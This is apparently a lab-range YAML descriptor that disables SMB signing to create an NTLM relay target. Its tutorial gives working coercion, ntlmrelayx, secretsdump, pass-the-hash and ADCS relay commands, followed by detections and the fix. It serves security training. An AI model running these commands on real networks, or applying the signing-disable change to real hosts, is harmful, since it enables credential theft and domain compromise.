@@ -1,0 +1,701 @@
+# Bolt-on: SMB Signing Disabled
+# ------------------------------
+# Install disables SMB packet signing on member servers
+# (RequireSecuritySignature = 0, EnableSecuritySignature = 0) so an NTLM
+# relay attacker can hijack the server's auth and execute as the relayed
+# user without packets being rejected for signature mismatch.
+#
+# DCs are excluded — the default GPO forces SMB signing on DCs and
+# overriding that is its own dedicated lab scenario.
+#
+# Patch re-enables RequireSecuritySignature + EnableSecuritySignature
+# and verifies via Get-SmbServerConfiguration.
+#
+# Elastic rule UUIDs sampled from:
+#   Research/elastic-detection-rules/rules/windows/credential_access_dollar_account_relay_ntlm.toml
+#   Research/elastic-detection-rules/rules/windows/credential_access_dollar_account_relay.toml
+#   Research/elastic-detection-rules/rules/windows/credential_access_relay_ntlm_auth_via_http_spoolss.toml
+
+id: bolton.protocol-network.smb-signing-disabled
+slug: smb-signing-disabled
+name: "SMB Signing Disabled"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-19
+
+category: protocol-network
+subcategory: smb
+tags:
+  - smb
+  - ntlm-relay
+  - signing
+  - adversary-in-the-middle
+description: >
+  Disables SMB server-side packet signing on a member server so authentication
+  bytes captured via NTLM coercion (PetitPotam, printer bug, file:// link
+  rendering, etc.) can be relayed to this host without being rejected for
+  signature failure. Sets HKLM\SYSTEM\CurrentControlSet\Services\
+  LanmanServer\Parameters\RequireSecuritySignature = 0 and
+  EnableSecuritySignature = 0. Domain controllers are excluded — DC signing
+  is forced by the default DC GPO and altering it warrants its own descriptor.
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1187/"
+  - "https://attack.mitre.org/techniques/T1557/001/"
+  - "https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing"
+  - "https://www.thehacker.recipes/ad/movement/ntlm/relay"
+
+mitre:
+  tactic:
+    id: TA0006
+    name: "Credential Access"
+  technique:
+    id: T1557
+    name: "Adversary-in-the-Middle"
+  subtechnique:
+    id: T1557.001
+    name: "LLMNR/NBT-NS Poisoning and SMB Relay"
+  notes: >
+    Pairs with T1187 (Forced Authentication) — SMB signing disabled is the
+    receiver-side enabler; coercion (PetitPotam, LLMNR) is the sender-side
+    enabler.
+
+detection:
+  coverage_status: partial
+  elastic_rules:
+    - rule_uuid: "23e5407a-b696-4433-9297-087645f2726c"
+      rule_name: "Potential NTLM Relay Attack against a Computer Account"
+      rule_filename: "windows/credential_access_dollar_account_relay_ntlm.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Fires on the relayed NTLM auth pattern — direct match for the post-exploit flow."
+    - rule_uuid: "263481c8-1e9b-492e-912d-d1760707f810"
+      rule_name: "Potential Computer Account NTLM Relay Activity"
+      rule_filename: "windows/credential_access_dollar_account_relay.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-04-15
+      notes: "Detects machine-account auth from non-owner host — fires when relayed credential lands."
+    - rule_uuid: "4682fd2c-cfae-47ed-a543-9bed37657aa6"
+      rule_name: "Potential Relay Attack against a Domain Controller"
+      rule_filename: "windows/credential_access_relay_ntlm_auth_via_http_spoolss.toml"
+      coverage: indirect
+      confidence: medium
+      last_validated: 2026-04-15
+      notes: "Catches the HTTP-front-end NTLM relay variant — applies when SMB signing OFF is paired with ADCS ESC8."
+  signal_sources:
+    - "Windows Event 4624 logon type 3 from a remote IP using a different machine's $ account"
+    - "Windows Event 5145 (network share object accessed) — sudden remote shares opened by relayed user"
+    - "Sysmon Event 3 (Network connection) — port 445 connections to the member server from unusual hosts"
+    - "Get-SmbServerConfiguration / 16-byte SMB header signature absence on packet capture"
+
+targets:
+  # 2026-05-23 audit fix: SMB signing is OFF by default on workstations
+  # AND member servers; ON by default only on DCs. Workstations need to be
+  # included since they're the most common relay-target in real lab
+  # scenarios (operator pivots from one workstation to another).
+  supported_os:
+    - family: windows
+      min_version: "7"
+      max_version: "11"
+      edition_in: []
+    - family: windows
+      min_version: "2008"
+      max_version: "2025"
+      edition_in: []
+  required_roles:
+    - workstation
+    - member_server
+  required_services:
+    - smb
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: true
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: community.windows.win_regedit
+      description: "Disable SMB server-side signing requirement."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: RequireSecuritySignature
+        data: 0
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Disable opportunistic SMB signing entirely."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: EnableSecuritySignature
+        data: 0
+        type: dword
+        state: present
+    - ansible_role: ansible.windows.win_service
+      description: "Restart the Server service so new signing config takes effect."
+      role_vars:
+        name: LanmanServer
+        state: restarted
+  verify:
+    probe: |
+      $cfg = Get-SmbServerConfiguration
+      if (-not $cfg.RequireSecuritySignature -and -not $cfg.EnableSecuritySignature) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+uninstall:
+  description: "Re-enable SMB signing requirement; restart the Server service."
+  estimated_time_seconds: 25
+  steps:
+    - ansible_role: community.windows.win_regedit
+      description: "Re-require SMB signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: RequireSecuritySignature
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Re-enable opportunistic SMB signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: EnableSecuritySignature
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: ansible.windows.win_service
+      description: "Restart Server service."
+      role_vars:
+        name: LanmanServer
+        state: restarted
+  verify:
+    probe: |
+      $cfg = Get-SmbServerConfiguration
+      if ($cfg.RequireSecuritySignature -and $cfg.EnableSecuritySignature) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Re-enable SMB packet signing as required by the canonical hardening
+    baseline (CIS Windows Server 2022 Benchmark §2.3.8.1-3 / Microsoft
+    Security Compliance Toolkit). Sets both RequireSecuritySignature and
+    EnableSecuritySignature to 1 on the server side, then enforces the
+    same on the client side (LanmanWorkstation), preventing this host
+    from accepting unsigned SMB sessions in either direction.
+  patch_reference:
+    - "https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing"
+    - "https://www.microsoft.com/en-us/download/details.aspx?id=55319"
+  complexity: low
+  side_effects:
+    - "RequireSecuritySignature = 1 on LanmanServer + LanmanWorkstation"
+    - "EnableSecuritySignature = 1 on both"
+    - "SMB throughput drops ~5-15% on signed sessions (CPU-bound hash verification)"
+    - "Legacy SMBv1 clients without signing capability lose connectivity"
+    - "Restart of Server + Workstation services — 3-5 second SMB session drop"
+  rollback_supported: true
+  steps:
+    - ansible_role: community.windows.win_regedit
+      description: "Server-side: require SMB signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: RequireSecuritySignature
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Server-side: enable SMB signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: EnableSecuritySignature
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Client-side: require SMB signing on outbound sessions."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'
+        name: RequireSecuritySignature
+        data: 1
+        type: dword
+        state: present
+    - ansible_role: ansible.windows.win_service
+      description: "Restart Server + Workstation services to apply."
+      role_vars:
+        name: LanmanServer
+        state: restarted
+  verify:
+    probe: |
+      $svr = Get-SmbServerConfiguration
+      $cli = Get-SmbClientConfiguration
+      if ($svr.RequireSecuritySignature -and $svr.EnableSecuritySignature -and $cli.RequireSecuritySignature) {
+        exit 0
+      } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/smb_signing_check.sh"
+
+patch_revert:
+  description: "Disable SMB signing again — server accepts unsigned + opportunistic sessions, relay path open."
+  estimated_time_seconds: 25
+  steps:
+    - ansible_role: community.windows.win_regedit
+      description: "Server-side: disable required signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: RequireSecuritySignature
+        data: 0
+        type: dword
+        state: present
+    - ansible_role: community.windows.win_regedit
+      description: "Server-side: disable opportunistic signing."
+      role_vars:
+        path: 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
+        name: EnableSecuritySignature
+        data: 0
+        type: dword
+        state: present
+    - ansible_role: ansible.windows.win_service
+      description: "Restart Server service."
+      role_vars:
+        name: LanmanServer
+        state: restarted
+  verify:
+    probe: |
+      $cfg = Get-SmbServerConfiguration
+      if (-not $cfg.RequireSecuritySignature) { exit 0 } else { exit 1 }
+    timeout_seconds: 60
+    expect_exit_code: 0
+  warning: "SMB signing OFF — host is a valid NTLM-relay landing pad. ntlmrelayx -t smb://<this-host> works."
+
+cost:
+  storage_mb: 0
+  cpu_pct: 0
+  detectability: quiet
+
+curriculum:
+  title: "SMB Signing Disabled — NTLM Relay Landing Pad"
+  summary: >
+    Guided walkthrough of weaponising an unsigned-SMB member server
+    (`tlms01` at 10.99.50.11) as the landing pad for NTLM relay
+    attacks in `testlab.local`. You will fingerprint the signing
+    posture from Kali, set up a coercion chain
+    (`coercer.py`/`dfscoerce.py` + `ntlmrelayx --socks`), relay a
+    coerced authentication from `tldc01` or `tlws01` into `tlms01`,
+    dump SAM via the SOCKS proxy as the relayed user, then walk the
+    SMB-signing GPO remediation and verify the relay path closes.
+    Covers MS-DFSNM (DFSCoerce) and MS-EFSR (PetitPotam) as coercion
+    primitives.
+  learning_objectives:
+    - "Fingerprint SMB signing posture with `nmap` + `crackmapexec`."
+    - "Use a Cobalt Strike BOF to coerce auth from tlws01 to the relay listener."
+    - "Run ntlmrelayx with `--socks` against tlms01 and validate the relayed session via proxychains."
+    - "Differentiate DFSCoerce (MS-DFSNM), PetitPotam (MS-EFSR), and PrinterBug (MS-RPRN) coercion primitives."
+    - "Identify the dollar-account-relay Elastic rules and explain why they fire after the relay lands."
+    - "Re-enable SMB signing via the bolt-on patch and prove the relay attempt fails."
+  prerequisites:
+    - "Kali at 192.168.1.100 with Impacket (`ntlmrelayx.py`, `dfscoerce.py`, `coercer`) + `crackmapexec` (or `netexec`)"
+    - "Beacon on tlws01 (10.99.50.12) as TESTLAB\\jdoe (Welcome1!) for the BOF-coercion path"
+    - "Adjacent bolt-on `smb-signing-disabled` applied to tlms01 — `RequireSecuritySignature = 0`"
+    - "Adjacent bolt-on `llmnr-nbtns-enabled` optional (provides a hash-capture path if coercion fails)"
+    - "Layer-3 routability from Kali to 10.99.50.0/24 (no need for L2 broadcast in this scenario)"
+  estimated_total_minutes: 45
+  steps:
+    - id: "01-fingerprint-signing"
+      title: "Fingerprint SMB signing across the lab"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 1 — Find the landing pad
+
+        Not every host accepts unsigned SMB. The default posture:
+
+        | Role | SMB signing default |
+        |---|---|
+        | Domain Controller (`tldc01`) | **Required** (Default Domain Controllers GPO) |
+        | Member server (`tlms01`) | Disabled by this bolt-on; default is "Enabled but not required" |
+        | Workstation (`tlws01`) | Default "Enabled but not required"; same exploitable posture |
+        | Linux Samba (`tllinux01`) | `server signing = auto` by default — exploitable |
+
+        Sweep the segment with `nmap`:
+
+        ```bash
+        nmap -p445 --script smb2-security-mode -n \
+             10.99.50.10 10.99.50.11 10.99.50.12 10.99.50.13
+        ```
+
+        Expected results:
+
+        ```
+        10.99.50.10 (tldc01):    "Message signing enabled and required"   <- skip
+        10.99.50.11 (tlms01):    "Message signing enabled but not required" <- TARGET
+        10.99.50.12 (tlws01):    "Message signing enabled but not required" <- usable
+        10.99.50.13 (tllinux01): "Message signing enabled but not required" <- usable
+        ```
+
+        Faster mass-fingerprint with `crackmapexec` / `netexec`:
+
+        ```bash
+        netexec smb 10.99.50.0/24 --gen-relay-list /tmp/relay-targets.txt
+        cat /tmp/relay-targets.txt
+        ```
+
+        `--gen-relay-list` outputs only hosts that *will* accept
+        relayed auth (signing not required). This is the file you
+        feed to `ntlmrelayx -tf`.
+
+        > **Detection:** SMB negotiation fingerprinting is invisible
+        > on endpoints — no Sysmon event fires. Network-layer
+        > detection only.
+    - id: "02-coerce-or-capture"
+      title: "Choose a coercion primitive"
+      estimated_minutes: 8
+      markdown: |
+        ## Step 2 — Pick how you get the auth bytes
+
+        Relay needs an *authentication transaction* to relay. Three
+        practical sources in this lab:
+
+        ### Option A — DFSCoerce (MS-DFSNM)
+
+        Forces *any* host running the DFSN service to authenticate to
+        you. Works against DCs, often without any patch tracking.
+
+        ```bash
+        impacket-dfscoerce -d testlab.local -u jdoe -p 'Welcome1!' \
+            192.168.1.100 10.99.50.10
+        # 10.99.50.10 (tldc01) -> auths to 192.168.1.100 as TLDC01$
+        ```
+
+        ### Option B — PetitPotam (MS-EFSR)
+
+        Same idea, different RPC interface. Recent patches narrow
+        which methods work; `coercer.py` cycles all known methods:
+
+        ```bash
+        coercer coerce --target-ip 10.99.50.10 \
+            --listener-ip 192.168.1.100 \
+            --username jdoe --password 'Welcome1!' \
+            --domain testlab.local
+        ```
+
+        ### Option C — PrinterBug (MS-RPRN)
+
+        Requires the Print Spooler running on the target. The
+        adjacent `printnightmare` bolt-on leaves Spooler on by
+        default; trigger via:
+
+        ```bash
+        impacket-rpcdump @tldc01 | grep MS-RPRN
+        # If listed:
+        impacket-printerbug TESTLAB/jdoe:'Welcome1!'@10.99.50.10 192.168.1.100
+        ```
+
+        ### Cobalt Strike BOF (preferred — keeps everything in-beacon)
+
+        Outflank's `C2-Tool-Collection / Coerce-Auth` BOFs
+        (https://github.com/outflanknl/C2-Tool-Collection) bundle
+        DFSCoerce + PetitPotam + PrinterBug as direct beacon BOFs:
+
+        ```text
+        beacon> inline-execute /opt/bofs/dfscoerce.x64.o 10.99.50.10 192.168.1.100
+        beacon> inline-execute /opt/bofs/petitpotam.x64.o 10.99.50.10 192.168.1.100
+        ```
+
+        Coerced auth arrives at `192.168.1.100` as
+        `TESTLAB\TLDC01$` (the DC's machine account). The DC's
+        machine account is **not** a Domain Admin, but it can DCSync
+        on most schemas — high-value relay payload.
+
+        > **Detection:** RPC-coercion calls are visible in Sysmon
+        > Event 1 (process create) of the executing binary on the
+        > *attacker* host — invisible on the target. The coerced
+        > auth's outbound 4624 on the DC is the first endpoint
+        > artefact. No bundled Elastic rule fires on coercion
+        > *initiation*; the relay-landing rules fire downstream
+        > (Step 4).
+      assessment:
+        question: "Why is the *machine account* of the coerced host (e.g. `TLDC01$`) often more valuable than a regular user credential to relay?"
+        options:
+          - "Machine accounts have weaker passwords than users."
+          - "Machine accounts are exempt from account lockout policy."
+          - "Machine accounts carry the privileges needed for DCSync / LDAP write to many objects, and machine-account creds are durable for 30 days."
+          - "Machine accounts bypass MFA."
+        correct_index: 2
+        explanation: >
+          Machine accounts (`HOSTNAME$`) hold the privileges granted
+          to the *computer object* in AD — for DCs that includes
+          replication rights (DCSync). Their passwords rotate every
+          30 days and aren't subject to user lockout. Relaying a DC's
+          machine account into an LDAP/SMB target gives the attacker a
+          high-privilege session that no password policy can prevent.
+    - id: "03-relay-with-socks"
+      title: "Relay the coerced auth into tlms01"
+      estimated_minutes: 10
+      markdown: |
+        ## Step 3 — ntlmrelayx with --socks
+
+        On Kali, launch the relay listener targeting the
+        SMB-signing-disabled host:
+
+        ```bash
+        echo "smb://10.99.50.11" > /tmp/targets.txt
+
+        impacket-ntlmrelayx \
+            -tf /tmp/targets.txt \
+            -smb2support \
+            --socks \
+            --no-http-server \
+            --output-file /tmp/relay.log
+        ```
+
+        Now coerce from another terminal (from Step 2):
+
+        ```bash
+        impacket-dfscoerce -d testlab.local -u jdoe -p 'Welcome1!' \
+            192.168.1.100 10.99.50.12
+        ```
+
+        ntlmrelayx console:
+
+        ```
+        [*] SMBD-Thread-3: Received connection from 10.99.50.12
+        [*] Authenticating against smb://10.99.50.11 as TESTLAB/JDOE SUCCEED
+        [*] SOCKS: Adding TESTLAB/JDOE@10.99.50.11(445) to active SOCKS connection
+        ```
+
+        Confirm the SOCKS session table:
+
+        ```bash
+        # In another terminal
+        nc 127.0.0.1 9050
+        # Type: socks
+        # Output:
+        # Protocol  Target            Username        AdminStatus  Port
+        # SMB       10.99.50.11       TESTLAB/JDOE    TRUE         445
+        ```
+
+        Configure `/etc/proxychains4.conf` (append at bottom):
+
+        ```ini
+        socks4 127.0.0.1 1080
+        ```
+
+        Use the relayed session via proxychains — any Impacket tool
+        with `-no-pass` will work:
+
+        ```bash
+        proxychains -q impacket-smbclient -no-pass TESTLAB/jdoe@10.99.50.11
+        proxychains -q impacket-secretsdump -no-pass TESTLAB/jdoe@10.99.50.11
+        proxychains -q impacket-wmiexec -no-pass TESTLAB/jdoe@10.99.50.11
+        ```
+
+        Expected: SAM dump if `jdoe` is local admin on `tlms01` (lab
+        default), full filesystem access via the C$ share, command
+        execution via WMI. All without knowing the password.
+
+        > **Detection:** Elastic rule
+        > `Potential NTLM Relay Attack against a Computer Account`
+        > (rule\_uuid `23e5407a-b696-4433-9297-087645f2726c`) fires
+        > on `tlms01`'s Security log when the relayed auth lands —
+        > the user account asserts a logon from an IP that doesn't
+        > own that account's machine SID. High fidelity.
+    - id: "04-escalate-and-pivot"
+      title: "Escalate via the SOCKS session"
+      estimated_minutes: 7
+      markdown: |
+        ## Step 4 — Turn the relay into long-term access
+
+        ### Dump SAM + cached creds via the proxy
+
+        ```bash
+        proxychains -q impacket-secretsdump -no-pass TESTLAB/jdoe@10.99.50.11 -outputfile /tmp/tlms01-dump
+        cat /tmp/tlms01-dump.sam
+        cat /tmp/tlms01-dump.secrets
+        ```
+
+        Local Administrator hash is now in your hands. Validate:
+
+        ```bash
+        proxychains -q netexec smb 10.99.50.11 -u Administrator \
+            -H aad3b435b51404eeaad3b435b51404ee:<NT-HASH> --local-auth
+        ```
+
+        ### Pass-the-hash to a fresh non-relayed session
+
+        Once you have the local Admin hash, you no longer need the
+        SOCKS proxy — pass-the-hash from anywhere with network
+        reachability:
+
+        ```bash
+        impacket-wmiexec -hashes :<NT-HASH> Administrator@10.99.50.11
+        impacket-psexec -hashes :<NT-HASH> Administrator@10.99.50.11
+        ```
+
+        ### Drop a beacon on tlms01
+
+        From the existing beacon on `tlws01`, pivot:
+
+        ```text
+        beacon> make_token TLMS01\Administrator aad3b435b51404eeaad3b435b51404ee:<NT-HASH>
+        beacon> jump psexec64 10.99.50.11 <listener>
+        ```
+
+        ### Coerce + relay to ADCS for golden cert (advanced)
+
+        If the lab also runs ADCS on `tldc01`, you can relay machine
+        account auth to the certificate enrollment endpoint:
+
+        ```bash
+        impacket-ntlmrelayx \
+            -t http://10.99.50.10/certsrv/certfnsh.asp \
+            --adcs --template DomainController \
+            -smb2support
+        ```
+
+        A coerced `TLDC01$` auth gets you a DC certificate, which
+        Rubeus turns into a TGT — full domain compromise.
+
+        > **Detection:** SAM dump triggers Sysmon Event 10 (process
+        > access) on `lsass.exe` on `tlms01` — high-fidelity signal.
+        > Pass-the-hash logon shows 4624 Type 9 (NewCredentials) on
+        > the source host. ADCS relay fires Elastic rule
+        > `Potential Relay Attack against a Domain Controller`
+        > (`4682fd2c-cfae-47ed-a543-9bed37657aa6`).
+      assessment:
+        question: "What does the `--socks` flag in ntlmrelayx do that simply running ntlmrelayx without it doesn't?"
+        options:
+          - "It encrypts the relayed traffic with TLS."
+          - "It bypasses SMB signing enforcement on the target."
+          - "It keeps the authenticated session open and exposes it as a SOCKS proxy, so the operator can run arbitrary tools (smbclient, secretsdump, wmiexec) through it as the relayed user."
+          - "It cracks the user's password as part of the relay."
+        correct_index: 2
+        explanation: >
+          Without `--socks`, ntlmrelayx runs a single action against
+          the target (default: SAM dump) then closes the session.
+          With `--socks`, the relayed authenticated session is
+          parked open and exposed on a local SOCKS proxy port. The
+          operator then runs any Impacket tool with `-no-pass` via
+          proxychains and operates *as the relayed user* for the
+          lifetime of the session — turning a one-shot relay into a
+          live foothold.
+    - id: "05-detect-and-mitigate"
+      title: "Blue-team — detection + mitigation"
+      estimated_minutes: 14
+      markdown: |
+        ## Step 5 — Detection map + the fix
+
+        ### Detection signal map (in order of fidelity)
+
+        | Phase | Best signal | Rule |
+        |---|---|---|
+        | Relayed auth lands on tlms01 | 4624 Type 3 + IP mismatch for the user's expected source | **`Potential NTLM Relay Attack against a Computer Account`** (`23e5407a-b696-4433-9297-087645f2726c`) — full coverage, high confidence |
+        | Computer account relay variant | 4624 Type 3 with `HOST$` from non-owner IP | **`Potential Computer Account NTLM Relay Activity`** (`263481c8-1e9b-492e-912d-d1760707f810`) — full coverage |
+        | ADCS / HTTP-front relay | HTTP 401 → 200 NTLM with mismatched source | `Potential Relay Attack against a Domain Controller` (`4682fd2c-cfae-47ed-a543-9bed37657aa6`) — indirect |
+        | SAM dump via relay | Sysmon Event 10 on lsass.exe from non-admin source | `LSASS Memory Dump Handle Access` rule (multiple variants) |
+        | PtH pivot | 4624 Type 9 (NewCredentials) | Behavioural |
+
+        ### Confirm current posture on tlms01
+
+        ```powershell
+        # On tlms01 (or via WinRM/SSM)
+        Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature
+        Get-SmbClientConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature
+        # Bolt-on installed: both server-side values are False
+        ```
+
+        ### The fix — re-require SMB signing (bolt-on patch)
+
+        The bolt-on's `patch` block runs the equivalent of:
+
+        ```powershell
+        # Server side
+        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' `
+                         -Name RequireSecuritySignature -Value 1 -Type DWord
+        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters' `
+                         -Name EnableSecuritySignature -Value 1 -Type DWord
+
+        # Client side (so this host also refuses to accept relayed auth via outbound conns)
+        Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters' `
+                         -Name RequireSecuritySignature -Value 1 -Type DWord
+
+        Restart-Service LanmanServer -Force
+        ```
+
+        For domain-wide rollout, use a GPO:
+
+        ```
+        Computer Configuration -> Policies -> Windows Settings ->
+          Security Settings -> Local Policies -> Security Options:
+            - Microsoft network server: Digitally sign communications (always) = Enabled
+            - Microsoft network server: Digitally sign communications (if client agrees) = Enabled
+            - Microsoft network client: Digitally sign communications (always) = Enabled
+        ```
+
+        ### Validate the fix
+
+        ```bash
+        # From Kali
+        nmap -p445 --script smb2-security-mode 10.99.50.11
+        # Should now show: "Message signing enabled and required"
+
+        # Re-run the relay attempt
+        impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support --socks
+        impacket-dfscoerce -d testlab.local -u jdoe -p 'Welcome1!' 192.168.1.100 10.99.50.12
+
+        # ntlmrelayx output should now show:
+        #   [-] Authenticating against smb://10.99.50.11 FAILED — SMB Signature Required
+        ```
+
+        ### Defence-in-depth (when SMB signing alone isn't enough)
+
+        1. **Extended Protection for Authentication (EPA)** on every
+           HTTP-based authentication endpoint (LDAPS, OWA, ADCS Web
+           Enrollment). Closes HTTP-front relay variants that bypass
+           SMB signing.
+        2. **LDAP channel binding + signing required** on DCs — sets
+           `LDAPServerIntegrity = 2` (mandatory). Closes
+           ntlmrelayx-to-LDAP variants.
+        3. **Disable NTLM** on critical services where Kerberos
+           suffices. Audit with Event 8004 first (NTLM auditing GPO).
+        4. **Apply MS-DFSNM / MS-EFSR / MS-RPRN patches** + disable
+           Print Spooler on non-print servers. Removes the *coercion*
+           primitives even if signing remains misconfigured somewhere.
+        5. **Kerberos-only enforcement for member-server SMB** — turn
+           off NTLM inbound for SMB sessions on `tlms01`-class hosts.
+        6. **Monitor MS-DFSNM RPC binding requests** (UUID
+           `4fc742e0-4a10-11cf-8273-00aa004ae673`) to catch DFSCoerce
+           even when relay fails.
+
+        > **Mitigation references:** Microsoft SMB signing guide
+        > (https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing),
+        > MITRE M1041 (Encrypt Sensitive Information), CISA AA23-129A
+        > on NTLM relay risk reduction.
+      assessment:
+        question: "After enabling `RequireSecuritySignature = 1` on tlms01, why does ntlmrelayx's relay attempt fail with `SMB Signature Required` even though the *coercion* still works?"
+        options:
+          - "The DC blocks ntlmrelayx by IP."
+          - "ntlmrelayx cannot forge a valid SMB signature without the user's password, so the target rejects the relayed session at the SMB layer."
+          - "SMB signing prevents the coercion RPC call from succeeding."
+          - "ntlmrelayx requires SMBv1 which is now disabled."
+        correct_index: 1
+        explanation: >
+          SMB signing requires the client to sign every SMB packet
+          with a key derived from the session key (which comes from
+          the user's NT hash via NTLMSSP). The attacker has the
+          authentication negotiation bytes but not the user's actual
+          NT hash — so they cannot compute a valid signature on
+          subsequent SMB requests. The target detects the missing /
+          invalid signature and rejects the session immediately after
+          the auth handshake. The coercion still succeeds because
+          coercion is an *outbound* call from the victim — the
+          attacker is just the listener.
+
+status: stable
